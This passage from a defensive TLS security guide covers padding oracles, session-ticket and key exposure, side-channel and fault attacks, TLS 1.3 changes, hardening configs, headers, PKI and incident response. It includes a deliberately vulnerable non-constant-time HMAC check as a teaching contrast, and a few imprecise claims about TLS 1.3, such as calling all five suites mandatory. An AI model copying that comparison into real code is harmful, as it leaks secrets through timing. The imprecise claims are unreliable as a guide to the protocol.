Julio Rizzo and Thai Duong demonstrated a padding oracle in **ASP.NET** ViewState and encrypted cookies:
- ViewState was encrypted with AES-CBC + HMAC, but HMAC was checked **after** decryption
- This allowed padding oracle attacks
- Microsoft released MS10-070 emergency patch

**Mitigation:**
- Use **Encrypt-then-MAC** (not MAC-then-Encrypt or Encrypt-then-check-padding)
- Better: use **AEAD** (GCM mode) — no padding, no separate MAC
- **Constant-time comparison** for all cryptographic verification

## 18. Session Ticket and Key Material Attacks

### What are Session Tickets?

TLS session resumption allows faster reconnection without a full handshake. **Session tickets** encrypt the session state (including session keys) with a server-side ticket key, and send it to the client. On reconnection, the client presents the ticket, and the server decrypts it to restore the session.

### 18.1 Session Ticket Key Exposure

If the **ticket encryption key** is compromised:
- All past sessions encrypted with that ticket (if preserved) can be decrypted
- **Violates forward secrecy** — session ticket keys are long-lived (often 24-48 hours)

**Real-world:** Session ticket keys shared across server farms without proper rotation have been a persistent problem.

**Mitigation:**
- **Rotate session ticket keys** frequently (every hour in high-security environments)
- Use **short ticket lifetimes** (`session-ticket-lifetime` setting)
- **Prefer session IDs over tickets** in high-security scenarios
- In TLS 1.3: session tickets are encrypted under keys derived via forward-secret ECDHE

### 18.2 Key Logging and Exfiltration

**SSLKEYLOGFILE:** A mechanism (supported by browsers for debugging) that logs TLS session keys to a file. If this is enabled in production, all TLS traffic can be decrypted.

**Mitigation:** Never enable `SSLKEYLOGFILE` in production environments. Monitor for this environment variable.

### 18.3 Private Key Theft

If the server's TLS private key is stolen:
- **Without forward secrecy (RSA key exchange):** All past recorded traffic can be decrypted
- **With forward secrecy (ECDHE):** Past sessions remain secure; only future connections are at risk (until cert is revoked and reissued)

**Mitigation:**
- Store private keys in **HSMs (Hardware Security Modules)**
- **Certificate and key rotation** policies
- **ECDHE cipher suites** for forward secrecy
- Revoke and reissue certificates immediately if compromise suspected

## 19. Cryptographic Implementation Attacks

### 19.1 Timing Side-Channel Attacks

**Definition:** Attacks that exploit variations in execution time to infer secret information.

**Why do timing differences occur?**
- Early exit on comparison failure (string comparison stops at first mismatch)
- Data-dependent branch paths
- Cache hits vs. cache misses
- Hardware optimization effects

**Example — Vulnerable string comparison:**
```python
# Vulnerable to timing attack
def check_hmac(provided, expected):
    return provided == expected  
# Python string comparison: stops at first mismatch
# Strings sharing longer prefix take longer to compare!
# Attacker can determine correct characters one by one
```

**Correct implementation — Constant-time comparison:**
```python
import hmac
# Constant time comparison — always compares all bytes
def check_hmac_secure(provided, expected):
    return hmac.compare_digest(provided, expected)
```

```rust
// Rust — constant-time comparison using subtle crate
use subtle::ConstantTimeEq;
let equal: bool = a.ct_eq(b).into();
```

```go
// Go — constant-time comparison
import "crypto/subtle"
result := subtle.ConstantTimeCompare(a, b)
```

### 19.2 Cache-Timing Attacks

**Definition:** Exploiting CPU cache behavior to infer secret information processed by cryptographic operations.

**Key concept:** CPU cache (L1/L2/L3) stores recently accessed memory. Accessing cached memory is ~100x faster than main memory (RAM).

**FLUSH+RELOAD attack:**
1. Attacker and victim share memory (shared library, shared cache)
2. Attacker **flushes** target memory lines from cache
3. Victim's cryptographic operation accesses memory in a data-dependent pattern
4. Attacker **measures** access time: fast = in cache (victim accessed it), slow = not cached
5. Pattern of cache accesses reveals secret key bits

**Real-world impact:**
- **AES table-based implementations:** Classic AES uses lookup tables (S-boxes). Table access pattern depends on plaintext and key → cache timing leaks key bits
- **RSA square-and-multiply:** Conditional operations based on key bits → timing leaks key

**Mitigation:**
- **Constant-time AES:** Use hardware AES instructions (AES-NI on x86) — no table lookups, constant time
- **Constant-time cryptographic implementations:** Open-source libraries (libsodium, AWS libcrypto) designed for this
- **Process isolation:** Prevent attacker process from sharing cache with crypto process

### 19.3 Fault Injection Attacks

**Definition:** Inducing computational faults (bit flips, voltage glitches) during cryptographic operations to extract secret information.

**Physical techniques:**
- **Voltage glitching:** Briefly drop CPU voltage to cause instruction skipping
- **Clock glitching:** Inject extra clock cycles
- **Laser fault injection:** Target specific transistors on chip
- **EM fault injection:** Electromagnetic pulses

**Differential Fault Analysis (DFA):**
1. Get one correct signature/encryption output S
2. Inject fault during computation, get faulty output S'
3. Analyze the difference between S and S' to recover key bits
4. Even a single fault in RSA-CRT signature can reveal the private key

**Software fault attacks:**
- **Rowhammer:** Repeatedly accessing DRAM rows causes bit flips in adjacent rows — potential crypto key corruption or privilege escalation

**Mitigation:**
- **Hardware security:** Tamper-resistant chips (HSMs, smart cards, TPMs)
- **Fault detection:** Double-compute critical values and verify they match
- **Redundancy:** CRC/parity checks on cryptographic intermediate values
- **Error detection in signatures:** Verify signature before returning it

## 20. TLS 1.3 — Security Improvements

TLS 1.3 (RFC 8446, 2018) is a ground-up security redesign. Understanding what was removed helps understand why those things were attack vectors.

### What Was Removed in TLS 1.3
```
| Removed Feature | Why Removed | Related Attack |
|----------------|-------------|----------------|
| SSL 2.0/3.0 | Completely broken | POODLE, DROWN |
| TLS 1.0/1.1 | Multiple vulnerabilities | BEAST, CRIME |
| RSA key exchange | No forward secrecy, ROBOT | ROBOT, DROWN |
| DHE < 1024 bits | Factoring attacks | Logjam |
| MD5, SHA-1 in PRF | Collision attacks | SLOTH |
| RC4 | Multiple breaks | Multiple |
| DES, 3DES | SWEET32, brute force | SWEET32 |
| AES-CBC | Padding oracle attacks | POODLE-TLS, Lucky 13 |
| Compression | CRIME attack | CRIME |
| Renegotiation | Renegotiation attack (2009) | CVE-2009-3555 |
| Export cipher suites | 40-bit keys, trivially broken | FREAK, Logjam |
| Session ticket keys | Static, no FS | Key exposure |
```
### What TLS 1.3 Mandates

**Mandatory cipher suites (only 5):**
- TLS_AES_128_GCM_SHA256
- TLS_AES_256_GCM_SHA384
- TLS_CHACHA20_POLY1305_SHA256
- TLS_AES_128_CCM_SHA256
- TLS_AES_128_CCM_8_SHA256

**All use AEAD:** No separate MAC, no padding, no padding oracle possible.

**Key exchange:** Only ECDHE and DHE (≥ 2048 bits) — mandatory forward secrecy.

**0-RTT (Zero Round Trip Time Resumption):**
- Allows data to be sent with the first handshake message
- **Caveat:** 0-RTT data has **no replay protection** — must only be used for idempotent requests

**Encrypted handshake:** After ServerHello, all handshake messages are encrypted — protects against eavesdropping on negotiation details.

## 21. Defense-in-Depth: Mitigation Strategies

### 21.1 Protocol Configuration

**TLS Version:**
```
# Minimum: TLS 1.2
# Recommended: TLS 1.3 only (or 1.2 + 1.3 with careful configuration)

# nginx configuration
ssl_protocols TLSv1.2 TLSv1.3;

# Apache configuration
SSLProtocol -all +TLSv1.2 +TLSv1.3
```

**Cipher Suites (TLS 1.2):**
```
# nginx — prioritize ECDHE-ECDSA, then ECDHE-RSA, all with GCM
ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers on;

# Apache
SSLCipherSuite ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:...
SSLHonorCipherOrder on
```

**Explicitly Disabled:**
```
# Never use these
!aNULL    # No authentication
!eNULL    # No encryption
!EXPORT   # Export-grade
!DES      # DES cipher
!RC4      # RC4 stream cipher
!MD5      # MD5 hash
!PSK      # Pre-shared key (unless you control it)
!3DES     # 3DES
```

### 21.2 Certificate Management

**Minimum requirements:**
- RSA: **2048-bit minimum** (4096 recommended for long-lived CA certs)
- ECDSA: **P-256 or P-384** (recommended over RSA — smaller keys, faster)
- Hash: **SHA-256 minimum** (SHA-384 for high-security)
- Validity: **90-day maximum** recommended (Let's Encrypt model)

**Certificate Transparency:**
```
# Verify CT SCTs are included in your certificate
openssl s_client -connect example.com:443 -tlsextdebug 2>&1 | grep "TLS server extension"
```

**OCSP Stapling:**
```
# nginx
ssl_stapling on;
ssl_stapling_verify on;
resolver 8.8.8.8 8.8.4.4 valid=300s;

# Verify stapling
openssl s_client -connect example.com:443 -status
```

### 21.3 Diffie-Hellman Parameters

**Generate custom, strong DH parameters:**
```bash
# Generate 2048-bit DH parameters (takes time but do it once)
openssl dhparam -out /etc/nginx/dhparam.pem 2048

# nginx configuration
ssl_dhparam /etc/nginx/dhparam.pem;
```

**Or better — use ECDHE exclusively:**
```
# nginx — specify ECDH curves (P-256, P-384, X25519)
ssl_ecdh_curve X25519:prime256v1:secp384r1;
```

## 22. Security Headers and Policies

### 22.1 HTTP Strict Transport Security (HSTS)

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

- `max-age=31536000` — Browser remembers HSTS for 1 year
- `includeSubDomains` — Applies to all subdomains
- `preload` — Eligible for browser preload list (submit at hstspreload.org)

### 22.2 Content Security Policy (CSP)

Controls what resources the browser is allowed to load:
```http
Content-Security-Policy: default-src 'self'; 
    script-src 'self' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    upgrade-insecure-requests;
```

**`upgrade-insecure-requests`:** Browser automatically upgrades HTTP subresource requests to HTTPS.

### 22.3 X-Content-Type-Options

```http
X-Content-Type-Options: nosniff
```

Prevents MIME-type sniffing — browser must use the declared Content-Type, not guess it from content. Mitigates content-type confusion attacks.

### 22.4 X-Frame-Options / Frame-Ancestors

```http
X-Frame-Options: DENY
# Or with CSP:
Content-Security-Policy: frame-ancestors 'none';
```

Prevents clickjacking — your page cannot be embedded in an iframe.

### 22.5 Certificate Authority Authorization (CAA) DNS Records

```dns
example.com. IN CAA 0 issue "letsencrypt.org"
example.com. IN CAA 0 issuewild ";"
example.com. IN CAA 0 iodef "mailto:security@example.com"
```

- Only Let's Encrypt can issue certificates for `example.com`
- No wildcard certificates allowed
- Report policy violations to security@example.com

### 22.6 Expect-CT Header

```http
Expect-CT: enforce, max-age=86400, report-uri="https://example.com/ct-report"
```

Requires browsers to check that the certificate appears in CT logs. Violations are reported.

### 22.7 Referrer-Policy

```http
Referrer-Policy: strict-origin-when-cross-origin
```

Controls how much referrer information is sent with requests — prevents leaking sensitive URL parameters.

### 22.8 Permissions-Policy

Controls browser features that can be used:
```http
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

## 23. PKI Best Practices and Certificate Management

### 23.1 Certificate Lifecycle Management

```
Certificate Lifecycle:
  Issuance → Deployment → Monitoring → Renewal → Revocation
      ↑                                               ↓
  Re-issuance  ←──────────────────────────────────────
```

**Automation:**
- **ACME protocol** (Automatic Certificate Management Environment) — Let's Encrypt's protocol
- **Certbot** — Most popular ACME client
- **cert-manager** (Kubernetes) — Automated certificate management for k8s

**Monitoring:**
- Track certificate expiry dates
- Alert at 30, 14, 7, 1 days before expiry
- Monitor CT logs for unauthorized issuance

### 23.2 Hardware Security Modules (HSMs)

An **HSM** is a physical computing device that safeguards and manages digital keys and performs cryptographic operations:

- Private key **never leaves the HSM** in plaintext
- All signing operations happen **inside the HSM**
- Tamper-evident/tamper-resistant hardware
- FIPS 140-2 Level 3/4 certification

**Cloud HSM options:**
- AWS CloudHSM
- Google Cloud HSM
- Azure Dedicated HSM
- HashiCorp Vault + HSM backend

### 23.3 Key Ceremony

**Definition:** A formal, audited procedure for generating, certifying, and storing cryptographic keys — especially CA root keys.

**Typical elements:**
- Multiple trusted parties present (M-of-N key sharing)
- Air-gapped, secured physical environment
- Video recording and independent auditors
- Hardware tokens for each key share holder

### 23.4 Private Key Storage Best Practices
```
| Storage Method | Security Level | Use Case |
|----------------|----------------|----------|
| Plain file on disk | Minimal | Development only |
| Encrypted file (passphrase) | Low | Small deployments |
| OS keystore (PKCS#12) | Medium | Application servers |
| HSM | High | Production, CA |
| Cloud KMS | High | Cloud-native workloads |
| TPM (Trusted Platform Module) | High | Device-bound keys |
```

## 24. Monitoring, Detection, and Incident Response

### 24.1 What to Monitor at Layer 6

**TLS Metrics to Monitor:**
- TLS handshake failure rates (elevated = possible attack or misconfiguration)
- Protocol version distribution (should be mostly TLS 1.2/1.3)
- Cipher suite distribution
- Certificate expiry alerts
- Invalid certificate warnings (potential MitM or cert expiry)

**Detection Signatures:**
```
# Signs of SSL stripping:
- HTTP requests to normally HTTPS URLs
- Mixed content warnings
- Unusual referrers (HTTP → HTTPS redirect chains)

# Signs of certificate substitution:
- Certificate fingerprint change
- Unknown CA in certificate chain
- CT log absence

# Signs of downgrade attack:
- Sudden drop in TLS version reported
- Unusual cipher suite negotiation
- TLS_FALLBACK_SCSV triggered (if server logs this)
```

### 24.2 TLS Fingerprinting

**JA3/JA3S:** Fingerprinting TLS clients and servers based on their handshake parameters:

```
JA3 = MD5(SSLVersion, Ciphers, Extensions, EllipticCurves, EllipticCurvePointFormats)
```

**Use cases:**
- Identify malware C2 communication (malware has distinctive JA3 fingerprints)
- Detect non-browser TLS clients pretending to be browsers
- Identify TLS interception proxies (JA3 doesn't match any known browser)

**Tools:** `Zeek` (Bro) with JA3 script, `ja3` Python library, Cloudflare publishes JA3 fingerprints.

### 24.3 SSL/TLS Inspection in SIEM

**Key events to alert on:**
1. Certificate validation failure (expired, self-signed, revoked, wrong hostname)
2. TLS version < 1.2 negotiated
3. Weak cipher suite negotiated (RC4, 3DES, export grade)
4. Certificate change for monitored endpoints
5. Self-signed certificate on monitored production hosts
6. Certificate issued by unexpected CA

### 24.4 Incident Response for L6 Compromises

**If private key is suspected compromised:**
```
1. IMMEDIATELY request certificate revocation from CA
   → CA's revocation portal, or emergency contact
2. Generate new RSA/ECDSA key pair (in HSM if available)
3. Issue new certificate with new key
4. Deploy new certificate to all affected servers
5. Update HPKP pins (if used) — or remove HPKP to avoid lockout
6. Force re-authentication of all active sessions
7. Investigate root cause
8. Monitor CT logs for certificates issued with old key
```

**If session tokens are exposed (Heartbleed-style):**
```
1. Patch the vulnerability
2. Invalidate ALL active sessions
3. Force users to re-authenticate
4. Advise password changes
5. Monitor for fraudulent activity
6. Preserve logs for forensics
```

## 25. Compliance and Standards

### 25.1 PCI DSS (Payment Card Industry Data Security Standard)

**Relevant TLS requirements (PCI DSS v4.0):**
- Requirement 4.2.1: Strong cryptography for all transmissions of cardholder data over open/public networks
- TLS 1.1 and below are not compliant — **minimum TLS 1.2** (TLS 1.3 recommended)
- RC4, SSL 2.0, SSL 3.0 are explicitly prohibited

### 25.2 NIST Guidelines

**NIST SP 800-52 Rev 2 (Guidelines for TLS Implementations):**
- TLS 1.2 or 1.3 required for federal systems
- Approved cipher suites listed
- Certificate requirements

**NIST SP 800-131A (Transitions):**
- RSA keys: 2048-bit minimum through 2030, 3072-bit recommended beyond 2030
- ECDSA: P-256 minimum
- SHA-256 minimum for hash functions

### 25.3 FIPS 140-2/140-3

**Federal Information Processing Standard:**
- Certifies cryptographic module security (hardware + software)
- Level 1: Basic security (algorithm correctness)
- Level 2: Tamper evidence
- Level 3: Tamper resistance
- Level 4: Complete physical security

Many government and regulated environments require FIPS-validated cryptographic modules.
